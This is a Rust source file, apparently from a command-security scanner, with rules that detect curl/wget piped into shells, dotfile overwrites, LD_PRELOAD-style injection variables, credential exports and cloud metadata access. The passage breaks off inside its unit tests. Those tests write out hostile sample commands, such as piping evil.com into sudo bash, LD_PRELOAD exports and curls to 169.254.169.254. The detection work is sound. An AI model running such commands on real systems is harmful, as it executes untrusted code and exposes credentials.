use crate::extract::ScanContext;
use crate::tokenize::{self, ShellType};
use crate::verdict::{Evidence, Finding, RuleId, Severity};

/// Run command-shape rules.
pub fn check(
    input: &str,
    shell: ShellType,
    cwd: Option<&str>,
    scan_context: ScanContext,
) -> Vec<Finding> {
    let mut findings = Vec::new();
    let segments = tokenize::tokenize(input, shell);

    // Check for pipe-to-interpreter patterns
    let has_pipe = segments.iter().any(|s| {
        s.preceding_separator.as_deref() == Some("|")
            || s.preceding_separator.as_deref() == Some("|&")
    });
    if has_pipe {
        check_pipe_to_interpreter(&segments, &mut findings);
    }

    // Check for insecure TLS flags in source commands
    for segment in &segments {
        if let Some(ref cmd) = segment.command {
            let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd).to_lowercase();
            if is_source_command(&cmd_base) {
                let tls_findings =
                    crate::rules::transport::check_insecure_flags(&segment.args, true);
                findings.extend(tls_findings);
            }
        }
    }

    // Check for dotfile overwrites
    check_dotfile_overwrite(&segments, &mut findings);

    // Check for archive extraction to sensitive paths
    check_archive_extract(&segments, &mut findings);

    // Check for cargo install/add without supply-chain audit (exec-only)
    if scan_context == ScanContext::Exec {
        check_vet_not_configured(&segments, cwd, &mut findings);
    }

    // Check for dangerous environment variable exports
    check_env_var_in_command(&segments, &mut findings);

    // Check for network destination access (metadata endpoints, private networks)
    check_network_destination(&segments, &mut findings);

    findings
}

/// Resolve the effective interpreter from a segment.
/// If the command is `sudo`, `env`, or an absolute path to one of them,
/// look past flags and flag-values to find the real interpreter.
fn resolve_interpreter_name(seg: &tokenize::Segment) -> Option<String> {
    if let Some(ref cmd) = seg.command {
        let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd).to_lowercase();
        if is_interpreter(&cmd_base) {
            return Some(cmd_base);
        }
        if cmd_base == "sudo" {
            // Flags that take a separate value argument
            let sudo_value_flags = ["-u", "-g", "-C", "-D", "-R", "-T"];
            let mut skip_next = false;
            for (idx, arg) in seg.args.iter().enumerate() {
                if skip_next {
                    skip_next = false;
                    continue;
                }
                let trimmed = arg.trim();
                if trimmed.starts_with("--") {
                    // --user=root: long flag with =, skip entirely
                    // --user root: long flag without =, skip next arg
                    if !trimmed.contains('=') {
                        skip_next = true;
                    }
                    continue;
                }
                if trimmed.starts_with('-') {
                    if sudo_value_flags.contains(&trimmed) {
                        skip_next = true;
                    }
                    continue;
                }
                let base = trimmed.rsplit('/').next().unwrap_or(trimmed).to_lowercase();
                if base == "env" {
                    return resolve_env_from_args(&seg.args[idx + 1..]);
                }
                if is_interpreter(&base) {
                    return Some(base);
                }
                break;
            }
        } else if cmd_base == "env" {
            return resolve_env_from_args(&seg.args);
        }
    }
    None
}

fn resolve_env_from_args(args: &[String]) -> Option<String> {
    let env_value_flags = ["-u", "-C"];
    let mut skip_next = false;
    for arg in args {
        if skip_next {
            skip_next = false;
            continue;
        }
        let trimmed = arg.trim();
        if trimmed.starts_with("--") {
            if !trimmed.contains('=') {
                skip_next = true;
            }
            continue;
        }
        if trimmed.starts_with('-') {
            if env_value_flags.contains(&trimmed) {
                skip_next = true;
            }
            continue;
        }
        // VAR=val assignments
        if trimmed.contains('=') {
            continue;
        }
        let base = trimmed.rsplit('/').next().unwrap_or(trimmed).to_lowercase();
        if is_interpreter(&base) {
            return Some(base);
        }
        break;
    }
    None
}

fn check_pipe_to_interpreter(segments: &[tokenize::Segment], findings: &mut Vec<Finding>) {
    for (i, seg) in segments.iter().enumerate() {
        if i == 0 {
            continue;
        }
        if let Some(sep) = &seg.preceding_separator {
            if sep == "|" || sep == "|&" {
                if let Some(interpreter) = resolve_interpreter_name(seg) {
                    // Find the source segment
                    if i > 0 {
                        let source = &segments[i - 1];
                        let source_cmd = source.command.as_deref().unwrap_or("unknown").to_string();
                        let source_base = source_cmd
                            .rsplit('/')
                            .next()
                            .unwrap_or(&source_cmd)
                            .to_lowercase();

                        // Skip if the source is tirith itself — its output is trusted.
                        if source_base == "tirith" {
                            continue;
                        }

                        let rule_id = match source_base.as_str() {
                            "curl" => RuleId::CurlPipeShell,
                            "wget" => RuleId::WgetPipeShell,
                            "http" | "https" => RuleId::HttpiePipeShell,
                            "xh" => RuleId::XhPipeShell,
                            _ => RuleId::PipeToInterpreter,
                        };

                        let display_cmd = seg.command.as_deref().unwrap_or(&interpreter);

                        findings.push(Finding {
                                rule_id,
                                severity: Severity::High,
                                title: format!("Pipe to interpreter: {source_cmd} | {display_cmd}"),
                                description: format!(
                                    "Command pipes output from '{source_base}' directly to interpreter '{interpreter}'. Downloaded content will be executed without inspection."
                                ),
                                evidence: vec![Evidence::CommandPattern {
                                    pattern: "pipe to interpreter".to_string(),
                                    matched: format!("{} | {}", source.raw, seg.raw),
                                }],
                                human_view: None,
                                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
                            });
                    }
                }
            }
        }
    }
}

fn check_dotfile_overwrite(segments: &[tokenize::Segment], findings: &mut Vec<Finding>) {
    for segment in segments {
        // Check for redirects to dotfiles
        let raw = &segment.raw;
        if (raw.contains("> ~/.")
            || raw.contains("> $HOME/.")
            || raw.contains(">> ~/.")
            || raw.contains(">> $HOME/."))
            && !raw.contains("> /dev/null")
        {
            findings.push(Finding {
                rule_id: RuleId::DotfileOverwrite,
                severity: Severity::High,
                title: "Dotfile overwrite detected".to_string(),
                description: "Command redirects output to a dotfile in the home directory, which could overwrite shell configuration".to_string(),
                evidence: vec![Evidence::CommandPattern {
                    pattern: "redirect to dotfile".to_string(),
                    matched: raw.clone(),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        }
    }
}

fn check_archive_extract(segments: &[tokenize::Segment], findings: &mut Vec<Finding>) {
    for segment in segments {
        if let Some(ref cmd) = segment.command {
            let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd).to_lowercase();
            if cmd_base == "tar" || cmd_base == "unzip" || cmd_base == "7z" {
                // Check if extracting to a sensitive directory
                let raw = &segment.raw;
                let sensitive_targets = [
                    "-C /",
                    "-C ~/",
                    "-C $HOME/",
                    "-d /",
                    "-d ~/",
                    "-d $HOME/",
                    "> ~/.",
                    ">> ~/.",
                ];
                for target in &sensitive_targets {
                    if raw.contains(target) {
                        findings.push(Finding {
                            rule_id: RuleId::ArchiveExtract,
                            severity: Severity::Medium,
                            title: "Archive extraction to sensitive path".to_string(),
                            description: format!(
                                "Archive command '{cmd_base}' extracts to a potentially sensitive location"
                            ),
                            evidence: vec![Evidence::CommandPattern {
                                pattern: "archive extract".to_string(),
                                matched: raw.clone(),
                            }],
                            human_view: None,
                            agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
                        });
                        return;
                    }
                }
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Phase 8: Dangerous environment variable detection
// ---------------------------------------------------------------------------

/// Environment variables that enable arbitrary code injection via dynamic linker.
const CODE_INJECTION_VARS: &[&str] = &[
    "LD_PRELOAD",
    "LD_LIBRARY_PATH",
    "LD_AUDIT",
    "DYLD_INSERT_LIBRARIES",
    "DYLD_LIBRARY_PATH",
];

/// Environment variables that cause arbitrary script execution at shell startup.
const SHELL_INJECTION_VARS: &[&str] = &["BASH_ENV", "ENV", "PROMPT_COMMAND"];

/// Environment variables that hijack interpreter module/library search paths.
const INTERPRETER_HIJACK_VARS: &[&str] = &["PYTHONPATH", "NODE_OPTIONS", "RUBYLIB", "PERL5LIB"];

/// Sensitive credential variable names that should not be exported in commands.
const SENSITIVE_KEY_VARS: &[&str] = &[
    "AWS_ACCESS_KEY_ID",
    "AWS_SECRET_ACCESS_KEY",
    "AWS_SESSION_TOKEN",
    "OPENAI_API_KEY",
    "ANTHROPIC_API_KEY",
    "GITHUB_TOKEN",
];

fn classify_env_var(name: &str) -> Option<(RuleId, Severity, &'static str, &'static str)> {
    if CODE_INJECTION_VARS.contains(&name) {
        Some((
            RuleId::CodeInjectionEnv,
            Severity::Critical,
            "Code injection environment variable",
            "can inject shared libraries into all processes, enabling arbitrary code execution",
        ))
    } else if SHELL_INJECTION_VARS.contains(&name) {
        Some((
            RuleId::ShellInjectionEnv,
            Severity::Critical,
            "Shell injection environment variable",
            "can cause arbitrary script execution at shell startup",
        ))
    } else if INTERPRETER_HIJACK_VARS.contains(&name) {
        Some((
            RuleId::InterpreterHijackEnv,
            Severity::High,
            "Interpreter hijack environment variable",
            "can hijack the interpreter's module/library search path",
        ))
    } else if SENSITIVE_KEY_VARS.contains(&name) {
        Some((
            RuleId::SensitiveEnvExport,
            Severity::High,
            "Sensitive credential exported",
            "exposes a sensitive credential that may be logged in shell history",
        ))
    } else {
        None
    }
}

/// Cargo global flags that consume the next token as a value.
const CARGO_VALUE_FLAGS: &[&str] = &[
    "-Z",
    "-C",
    "--config",
    "--manifest-path",
    "--color",
    "--target-dir",
    "--target",
];

/// Find the cargo subcommand (first positional arg), skipping flags and toolchain specs.
/// Returns true if the subcommand is `install` or `add`.
fn is_cargo_install_or_add(args: &[String]) -> bool {
    let mut skip_next = false;
    for arg in args {
        if skip_next {
            skip_next = false;
            continue;
        }
        // Toolchain specs (+nightly, +stable)
        if arg.starts_with('+') {
            continue;
        }
        // Long flags with = (--config=foo): skip this arg only
        if arg.starts_with("--") && arg.contains('=') {
            continue;
        }
        // Known value-taking flags: skip this AND next
        if CARGO_VALUE_FLAGS.contains(&arg.as_str()) {
            skip_next = true;
            continue;
        }
        // Other flags (--locked, -v, etc.)
        if arg.starts_with('-') {
            continue;
        }
        // First positional arg is the subcommand — only match install/add
        return arg == "install" || arg == "add";
    }
    false
}

/// Warn when `cargo install/add` is used and no supply-chain audit directory exists.
fn check_vet_not_configured(
    segments: &[tokenize::Segment],
    cwd: Option<&str>,
    findings: &mut Vec<Finding>,
) {
    let is_cargo_install = segments.iter().any(|s| {
        if let Some(ref cmd) = s.command {
            let base = cmd
                .rsplit(['/', '\\'])
                .next()
                .unwrap_or(cmd)
                .to_ascii_lowercase();
            let base = base.strip_suffix(".exe").unwrap_or(&base);
            if base == "cargo" {
                return is_cargo_install_or_add(&s.args);
            }
        }
        false
    });
    if !is_cargo_install {
        return;
    }

    // Check if supply-chain/ config exists relative to the analysis context cwd.
    // Require an explicit cwd — without one we cannot reliably check the filesystem.
    let cwd = match cwd {
        Some(dir) => dir,
        None => return,
    };
    let check_path = std::path::PathBuf::from(cwd).join("supply-chain/config.toml");
    if check_path.exists() {
        return;
    }

    findings.push(Finding {
        rule_id: RuleId::VetNotConfigured,
        severity: Severity::Low,
        title: "No supply-chain audit configured".into(),
        description: "Consider running `cargo vet init` to enable dependency auditing.".into(),
        evidence: vec![],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    });
}

fn check_env_var_in_command(segments: &[tokenize::Segment], findings: &mut Vec<Finding>) {
    for segment in segments {
        let Some(ref cmd) = segment.command else {
            continue;
        };
        let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd).to_lowercase();

        match cmd_base.as_str() {
            "export" => {
                for arg in &segment.args {
                    if let Some((var_name, value)) = arg.split_once('=') {
                        emit_env_finding(var_name.trim(), value, findings);
                    }
                }
            }
            "env" => {
                for arg in &segment.args {
                    let trimmed = arg.trim();
                    if trimmed.starts_with('-') {
                        continue;
                    }
                    if let Some((var_name, value)) = trimmed.split_once('=') {
                        emit_env_finding(var_name.trim(), value, findings);
                    }
                }
            }
            "set" => {
                // Fish shell: set [-gx] VAR_NAME value...
                let mut var_name: Option<&str> = None;
                let mut value_parts: Vec<&str> = Vec::new();
                for arg in &segment.args {
                    let trimmed = arg.trim();
                    if trimmed.starts_with('-') && var_name.is_none() {
                        continue;
                    }
                    if var_name.is_none() {
                        var_name = Some(trimmed);
                    } else {
                        value_parts.push(trimmed);
                    }
                }
                if let Some(name) = var_name {
                    emit_env_finding(name, &value_parts.join(" "), findings);
                }
            }
            _ => {}
        }
    }
}

fn emit_env_finding(var_name: &str, value: &str, findings: &mut Vec<Finding>) {
    let Some((rule_id, severity, title_prefix, desc_suffix)) = classify_env_var(var_name) else {
        return;
    };
    let value_preview = redact_env_value(value);
    findings.push(Finding {
        rule_id,
        severity,
        title: format!("{title_prefix}: {var_name}"),
        description: format!("Setting {var_name} {desc_suffix}"),
        evidence: vec![Evidence::EnvVar {
            name: var_name.to_string(),
            value_preview,
        }],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    });
}

fn redact_env_value(val: &str) -> String {
    let prefix = crate::util::truncate_bytes(val, 20);
    if prefix.len() == val.len() {
        val.to_string()
    } else {
        format!("{prefix}...")
    }
}

// ---------------------------------------------------------------------------
// Phase 9 (free): Network destination detection
// ---------------------------------------------------------------------------

/// Cloud metadata endpoint IPs that expose instance credentials.
const METADATA_ENDPOINTS: &[&str] = &["169.254.169.254", "100.100.100.200"];

fn check_network_destination(segments: &[tokenize::Segment], findings: &mut Vec<Finding>) {
    for segment in segments {
        let Some(ref cmd) = segment.command else {
            continue;
        };
        let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd).to_lowercase();
        if !is_source_command(&cmd_base) {
            continue;
        }

        for arg in &segment.args {
            let trimmed = arg.trim().trim_matches(|c: char| c == '\'' || c == '"');
            if trimmed.starts_with('-') {
                continue;
            }

            if let Some(host) = extract_host_from_arg(trimmed) {
                if METADATA_ENDPOINTS.contains(&host.as_str()) {
                    findings.push(Finding {
                        rule_id: RuleId::MetadataEndpoint,
                        severity: Severity::Critical,
                        title: format!("Cloud metadata endpoint access: {host}"),
                        description: format!(
                            "Command accesses cloud metadata endpoint {host}, \
                             which can expose instance credentials and sensitive configuration"
                        ),
                        evidence: vec![Evidence::Url {
                            raw: trimmed.to_string(),
                        }],
                        human_view: None,
                        agent_view: None,
                        mitre_id: None,
                        custom_rule_id: None,
                    });
                } else if is_private_ip(&host) {
                    findings.push(Finding {
                        rule_id: RuleId::PrivateNetworkAccess,
                        severity: Severity::High,
                        title: format!("Private network access: {host}"),
                        description: format!(
                            "Command accesses private network address {host}, \
                             which may indicate SSRF or lateral movement"
                        ),
                        evidence: vec![Evidence::Url {
                            raw: trimmed.to_string(),
                        }],
                        human_view: None,
                        agent_view: None,
                        mitre_id: None,
                        custom_rule_id: None,
                    });
                }
            }
        }
    }
}

/// Extract a host/IP from a URL-like command argument.
fn extract_host_from_arg(arg: &str) -> Option<String> {
    // URL with scheme: http://HOST[:PORT]/path
    if let Some(scheme_end) = arg.find("://") {
        let after_scheme = &arg[scheme_end + 3..];
        // Strip userinfo (anything before @)
        let after_userinfo = if let Some(at_idx) = after_scheme.find('@') {
            &after_scheme[at_idx + 1..]
        } else {
            after_scheme
        };
        // Get host:port (before first /)
        let host_port = after_userinfo.split('/').next().unwrap_or(after_userinfo);
        let host = strip_port(host_port);
        // Reject obviously invalid hosts (malformed brackets, embedded paths)
        if host.is_empty() || host.contains('/') || host.contains('[') {
            return None;
        }
        return Some(host);
    }

    // Bare host/IP: "169.254.169.254/path" or just "169.254.169.254"
    let host_part = arg.split('/').next().unwrap_or(arg);
    let host = strip_port(host_part);

    // Accept valid IPv4 addresses for bare hosts (no scheme)
    if host.parse::<std::net::Ipv4Addr>().is_ok() {
        return Some(host);
    }

    // Accept bracketed IPv6: [::1]
    if host_part.starts_with('[') {
        if let Some(bracket_end) = host_part.find(']') {
            let ipv6 = &host_part[1..bracket_end];
            if ipv6.parse::<std::net::Ipv6Addr>().is_ok() {
                return Some(ipv6.to_string());
            }
        }
    }

    None
}

/// Strip port number from a host:port string, handling IPv6 brackets.
fn strip_port(host_port: &str) -> String {
    // Handle IPv6: [::1]:8080
    if host_port.starts_with('[') {
        if let Some(bracket_end) = host_port.find(']') {
            return host_port[1..bracket_end].to_string();
        }
    }
    // IPv4 or hostname: strip trailing :PORT
    if let Some(colon_idx) = host_port.rfind(':') {
        if host_port[colon_idx + 1..].parse::<u16>().is_ok() {
            return host_port[..colon_idx].to_string();
        }
    }
    host_port.to_string()
}

/// Check if an IPv4 address is in a private/reserved range (excluding loopback).
fn is_private_ip(host: &str) -> bool {
    if let Ok(ip) = host.parse::<std::net::Ipv4Addr>() {
        let octets = ip.octets();
        // Loopback (127.x) is excluded — local traffic has no SSRF/lateral movement risk.
        if octets[0] == 127 {
            return false;
        }
        return octets[0] == 10
            || (octets[0] == 172 && (16..=31).contains(&octets[1]))
            || (octets[0] == 192 && octets[1] == 168);
    }
    false
}

fn is_source_command(cmd: &str) -> bool {
    matches!(
        cmd,
        "curl"
            | "wget"
            | "http"
            | "https"
            | "xh"
            | "fetch"
            | "scp"
            | "rsync"
            | "iwr"
            | "irm"
            | "invoke-webrequest"
            | "invoke-restmethod"
    )
}

fn is_interpreter(cmd: &str) -> bool {
    matches!(
        cmd,
        "sh" | "bash"
            | "zsh"
            | "dash"
            | "ksh"
            | "python"
            | "python3"
            | "node"
            | "perl"
            | "ruby"
            | "php"
            | "iex"
            | "invoke-expression"
    )
}

/// Check command destination hosts against policy network deny/allow lists (Team feature).
///
/// For each source command (curl, wget, etc.), extracts the destination host and
/// checks against deny/allow lists. Allow takes precedence (exempts from deny).
pub fn check_network_policy(
    input: &str,
    shell: ShellType,
    deny: &[String],
    allow: &[String],
) -> Vec<Finding> {
    if deny.is_empty() {
        return Vec::new();
    }

    let segments = tokenize::tokenize(input, shell);
    let mut findings = Vec::new();

    for segment in &segments {
        let Some(ref cmd) = segment.command else {
            continue;
        };
        let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd).to_lowercase();
        if !is_source_command(&cmd_base) {
            continue;
        }

        for arg in &segment.args {
            let trimmed = arg.trim().trim_matches(|c: char| c == '\'' || c == '"');
            if trimmed.starts_with('-') {
                continue;
            }

            if let Some(host) = extract_host_from_arg(trimmed) {
                // Allow list exempts from deny
                if matches_network_list(&host, allow) {
                    continue;
                }
                if matches_network_list(&host, deny) {
                    findings.push(Finding {
                        rule_id: RuleId::CommandNetworkDeny,
                        severity: Severity::Critical,
                        title: format!("Network destination denied by policy: {host}"),
                        description: format!(
                            "Command accesses {host}, which is on the network deny list"
                        ),
                        evidence: vec![Evidence::Url {
                            raw: trimmed.to_string(),
                        }],
                        human_view: None,
                        agent_view: None,
                        mitre_id: None,
                        custom_rule_id: None,
                    });
                    return findings;
                }
            }
        }
    }

    findings
}

/// Check if a host matches any entry in a network list.
///
/// Supports exact hostname match, suffix match (`.example.com` matches
/// `sub.example.com`), and CIDR match for IPv4 addresses.
fn matches_network_list(host: &str, list: &[String]) -> bool {
    for entry in list {
        // CIDR match: "10.0.0.0/8"
        if entry.contains('/') {
            if let Some(matched) = cidr_contains(host, entry) {
                if matched {
                    return true;
                }
                continue;
            }
        }

        // Exact match
        if host.eq_ignore_ascii_case(entry) {
            return true;
        }

        // Suffix match: entry "example.com" matches "sub.example.com"
        if host.len() > entry.len()
            && host.ends_with(entry.as_str())
            && host.as_bytes()[host.len() - entry.len() - 1] == b'.'
        {
            return true;
        }
    }
    false
}

/// Check if an IPv4 address is within a CIDR range.
/// Returns `Some(true/false)` if both parse, `None` if either fails.
fn cidr_contains(host: &str, cidr: &str) -> Option<bool> {
    let parts: Vec<&str> = cidr.splitn(2, '/').collect();
    if parts.len() != 2 {
        return None;
    }
    let network: std::net::Ipv4Addr = parts[0].parse().ok()?;
    let prefix_len: u32 = parts[1].parse().ok()?;
    if prefix_len > 32 {
        return None;
    }
    let host_ip: std::net::Ipv4Addr = host.parse().ok()?;

    let mask = if prefix_len == 0 {
        0u32
    } else {
        !0u32 << (32 - prefix_len)
    };
    let net_bits = u32::from(network) & mask;
    let host_bits = u32::from(host_ip) & mask;

    Some(net_bits == host_bits)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Helper: run `check()` with no cwd and Exec context (the common case for tests).
    fn check_default(input: &str, shell: ShellType) -> Vec<Finding> {
        check(input, shell, None, ScanContext::Exec)
    }

    #[test]
    fn test_pipe_sudo_flags_detected() {
        let findings = check_default(
            "curl https://evil.com | sudo -u root bash",
            ShellType::Posix,
        );
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through sudo -u root bash"
        );
    }

    #[test]
    fn test_pipe_sudo_long_flag_detected() {
        let findings = check_default(
            "curl https://evil.com | sudo --user=root bash",
            ShellType::Posix,
        );
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through sudo --user=root bash"
        );
    }

    #[test]
    fn test_pipe_env_var_assignment_detected() {
        let findings = check_default("curl https://evil.com | env VAR=1 bash", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through env VAR=1 bash"
        );
    }

    #[test]
    fn test_pipe_env_u_flag_detected() {
        let findings = check_default("curl https://evil.com | env -u HOME bash", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through env -u HOME bash"
        );
    }

    #[test]
    fn test_dotfile_overwrite_detected() {
        let cases = [
            "echo malicious > ~/.bashrc",
            "echo malicious >> ~/.bashrc",
            "curl https://evil.com > ~/.bashrc",
            "cat payload > ~/.profile",
            "echo test > $HOME/.bashrc",
        ];
        for input in &cases {
            let findings = check_default(input, ShellType::Posix);
            eprintln!(
                "INPUT: {:?} -> findings: {:?}",
                input,
                findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
            );
            assert!(
                findings
                    .iter()
                    .any(|f| f.rule_id == RuleId::DotfileOverwrite),
                "should detect dotfile overwrite in: {input}",
            );
        }
    }

    #[test]
    fn test_pipe_env_s_flag_detected() {
        let findings = check_default("curl https://evil.com | env -S bash -x", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through env -S bash -x"
        );
    }

    #[test]
    fn test_pipe_sudo_env_detected() {
        let findings = check_default(
            "curl https://evil.com | sudo env VAR=1 bash",
            ShellType::Posix,
        );
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through sudo env VAR=1 bash"
        );
    }

    #[test]
    fn test_httpie_pipe_bash() {
        let findings = check_default("http https://evil.com/install.sh | bash", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::HttpiePipeShell),
            "should detect HTTPie pipe to bash"
        );
    }

    #[test]
    fn test_httpie_https_pipe_bash() {
        let findings = check_default("https https://evil.com/install.sh | bash", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::HttpiePipeShell),
            "should detect HTTPie https pipe to bash"
        );
    }

    #[test]
    fn test_xh_pipe_bash() {
        let findings = check_default("xh https://evil.com/install.sh | bash", ShellType::Posix);
        assert!(
            findings.iter().any(|f| f.rule_id == RuleId::XhPipeShell),
            "should detect xh pipe to bash"
        );
    }

    #[test]
    fn test_xh_pipe_sudo_bash() {
        let findings = check_default(
            "xh https://evil.com/install.sh | sudo bash",
            ShellType::Posix,
        );
        assert!(
            findings.iter().any(|f| f.rule_id == RuleId::XhPipeShell),
            "should detect xh pipe to sudo bash"
        );
    }

    #[test]
    fn test_httpie_no_pipe_safe() {
        let findings = check_default("http https://example.com/api/data", ShellType::Posix);
        assert!(
            !findings
                .iter()
                .any(|f| f.rule_id == RuleId::HttpiePipeShell),
            "HTTPie without pipe should not trigger"
        );
    }

    #[test]
    fn test_xh_no_pipe_safe() {
        let findings = check_default("xh https://example.com/api/data", ShellType::Posix);
        assert!(
            !findings.iter().any(|f| f.rule_id == RuleId::XhPipeShell),
            "xh without pipe should not trigger"
        );
    }

    #[test]
    fn test_export_ld_preload() {
        let findings = check_default("export LD_PRELOAD=/evil/lib.so", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::CodeInjectionEnv),
            "should detect LD_PRELOAD export"
        );
    }

    #[test]
    fn test_export_bash_env() {
        let findings = check_default("export BASH_ENV=/tmp/evil.sh", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::ShellInjectionEnv),
            "should detect BASH_ENV export"
        );
    }

    #[test]
    fn test_export_pythonpath() {
        let findings = check_default("export PYTHONPATH=/evil/modules", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::InterpreterHijackEnv),
            "should detect PYTHONPATH export"
        );
    }

    #[test]
    fn test_export_openai_key() {
        let findings = check_default("export OPENAI_API_KEY=sk-abc123", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SensitiveEnvExport),
            "should detect OPENAI_API_KEY export"
        );
    }

    #[test]
    fn test_export_path_safe() {
        let findings = check_default("export PATH=/usr/bin:$PATH", ShellType::Posix);
        assert!(
            !findings.iter().any(|f| matches!(
                f.rule_id,
                RuleId::CodeInjectionEnv
                    | RuleId::ShellInjectionEnv
                    | RuleId::InterpreterHijackEnv
                    | RuleId::SensitiveEnvExport
            )),
            "export PATH should not trigger env var detection"
        );
    }

    #[test]
    fn test_env_ld_preload_cmd() {
        let findings = check_default(
            "env LD_PRELOAD=/evil/lib.so /usr/bin/target",
            ShellType::Posix,
        );
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::CodeInjectionEnv),
            "should detect LD_PRELOAD via env command"
        );
    }

    #[test]
    fn test_curl_metadata_endpoint() {
        let findings = check_default(
            "curl http://169.254.169.254/latest/meta-data",
            ShellType::Posix,
        );
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::MetadataEndpoint),
            "should detect AWS metadata endpoint"
        );
    }

    #[test]
    fn test_curl_private_network() {
        let findings = check_default("curl http://10.0.0.1/internal/api", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::PrivateNetworkAccess),
            "should detect private network access"
        );
    }

    #[test]
    fn test_curl_public_ip_safe() {
        let findings = check_default("curl http://8.8.8.8/dns-query", ShellType::Posix);
        assert!(
            !findings.iter().any(|f| matches!(
                f.rule_id,
                RuleId::MetadataEndpoint | RuleId::PrivateNetworkAccess
            )),
            "public IP should not trigger network destination detection"
        );
    }

    #[test]
    fn test_metadata_bare_ip() {
        let findings = check_default("curl 169.254.169.254/latest/meta-data", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::MetadataEndpoint),
            "should detect bare IP metadata endpoint"
        );
    }

    #[test]
    fn test_extract_host_from_url() {
        assert_eq!(
            extract_host_from_arg("http://169.254.169.254/latest"),
            Some("169.254.169.254".to_string())
        );
        assert_eq!(
            extract_host_from_arg("http://10.0.0.1:8080/api"),
            Some("10.0.0.1".to_string())
        );
        assert_eq!(
            extract_host_from_arg("169.254.169.254/path"),
            Some("169.254.169.254".to_string())
        );
        assert_eq!(
            extract_host_from_arg("8.8.8.8"),
            Some("8.8.8.8".to_string())
        );
        assert_eq!(extract_host_from_arg("-H"), None);
        assert_eq!(extract_host_from_arg("output.txt"), None);
    }

    // --- Network policy tests ---

    #[test]
    fn test_network_policy_deny_exact() {
        let deny = vec!["evil.com".to_string()];
        let allow = vec![];
        let findings = check_network_policy(
            "curl https://evil.com/data",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::CommandNetworkDeny);
    }

    #[test]
    fn test_network_policy_deny_subdomain() {
        let deny = vec!["evil.com".to_string()];
        let allow = vec![];
        let findings = check_network_policy(
            "wget https://sub.evil.com/data",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::CommandNetworkDeny);
    }

    #[test]
    fn test_network_policy_deny_cidr() {
        let deny = vec!["10.0.0.0/8".to_string()];
        let allow = vec![];
        let findings =
            check_network_policy("curl http://10.1.2.3/api", ShellType::Posix, &deny, &allow);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::CommandNetworkDeny);
    }

    #[test]
    fn test_network_policy_allow_exempts() {
        let deny = vec!["evil.com".to_string()];
        let allow = vec!["safe.evil.com".to_string()];
        let findings = check_network_policy(
            "curl https://safe.evil.com/data",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 0, "allow list should exempt from deny");
    }

    #[test]
    fn test_network_policy_no_match() {
        let deny = vec!["evil.com".to_string()];
        let allow = vec![];
        let findings = check_network_policy(
            "curl https://example.com/data",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 0);
    }

    #[test]
    fn test_network_policy_empty_deny() {
        let deny = vec![];
        let allow = vec![];
        let findings =
            check_network_policy("curl https://evil.com", ShellType::Posix, &deny, &allow);
        assert_eq!(
            findings.len(),
            0,
            "empty deny list should produce no findings"
        );
    }

    #[test]
    fn test_cidr_contains() {
        assert_eq!(cidr_contains("10.0.0.1", "10.0.0.0/8"), Some(true));
        assert_eq!(cidr_contains("10.255.255.255", "10.0.0.0/8"), Some(true));
        assert_eq!(cidr_contains("11.0.0.1", "10.0.0.0/8"), Some(false));
        assert_eq!(cidr_contains("192.168.1.1", "192.168.0.0/16"), Some(true));
        assert_eq!(cidr_contains("192.169.1.1", "192.168.0.0/16"), Some(false));
        assert_eq!(cidr_contains("not-an-ip", "10.0.0.0/8"), None);
        assert_eq!(cidr_contains("10.0.0.1", "invalid"), None);
    }

    #[test]
    fn test_matches_network_list_hostname() {
        let list = vec!["evil.com".to_string(), "bad.org".to_string()];
        assert!(matches_network_list("evil.com", &list));
